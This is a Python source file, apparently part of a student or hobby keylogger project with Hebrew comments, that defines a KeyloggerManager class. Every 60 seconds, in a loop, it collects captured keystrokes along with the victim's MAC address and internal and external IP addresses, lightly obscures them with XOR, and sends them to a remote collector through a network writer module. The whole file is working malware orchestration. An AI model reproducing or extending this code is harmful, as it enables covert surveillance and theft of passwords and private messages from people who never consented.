from keylogger_service import KeyloggerService
from encryptor import Encryptor
from file_wirter import FileWriter
from network_writer import NetworkWriter
from getmac import get_mac_address
import getmac
import requests
import socket
import time
import logging

logging.basicConfig(
    filename="keylogger.log",
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
    force=True
)

class KeyloggerManager:

    def __init__(self):
        self.active = True
        self.keylogger = KeyloggerService()
        self.encryptor = Encryptor()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        #כאן אני בודק האם יש שגיאה כלשהיא בהפעלה ומדפיס אותה לקישור פרטי
        self.main()

    def main(self):
        while self.active:
            try:
                data = self.keylogger.data
                # אולי עדיף להצפין גם את הכתובת מאק
                mac_name = self.get_mac_details()
                internal_ip, external_ip = self.get_ip_details()
                wrapper = {"mac_name" : mac_name,
                           "internal_ip" : internal_ip,
                           "external_ip" : external_ip,
                           "data" : data}
                wrapper = self.encryptor.xor(wrapper)
                self.network_writer.send_data(wrapper)
                time.sleep(60)
            except Exception as e:
                logging.error(e)


    @staticmethod
    def get_mac_details():
        return get_mac_address()

    @staticmethod
    def get_ip_details():
        internal_ip = socket.gethostbyname(socket.gethostname())
        external_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
        return internal_ip,external_ip

    def stop(self):
        self.active = False

if __name__ == '__main__':
    key = KeyloggerManager()





